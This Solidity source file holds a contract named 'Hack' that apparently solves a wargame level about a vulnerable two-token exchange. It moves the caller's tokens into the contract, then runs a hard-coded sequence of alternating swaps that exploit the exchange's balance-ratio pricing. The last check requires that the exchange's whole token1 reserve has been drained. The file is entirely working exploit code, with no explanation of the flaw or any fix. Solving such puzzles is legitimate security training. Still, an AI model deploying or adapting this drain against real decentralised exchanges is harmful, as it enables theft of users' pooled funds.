// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";*/

contract Hack {
    IDex dex;
    IERC20 public token1;
    IERC20 public token2;
    constructor(IDex target) {
        dex = target;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }
    
    function hack() public {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        //before all this you have to approve the attack contract to deal with ur tokens
        //to do it put the token1 and token2 address on the the At Address placeholder when deploying the IERC20

        dex.approve(address(dex), type(uint256).max);
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2),address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2),address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        
        uint lastAmount;
        // x * 110 / 45 = 110
        // x = 110 / 110 * 45
        // x = 45
        lastAmount = 45;

        dex.swap(address(token2),address(token1), 45);
        require(token1.balanceOf(address(dex)) == 0, "failed");
    }
}

interface IDex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
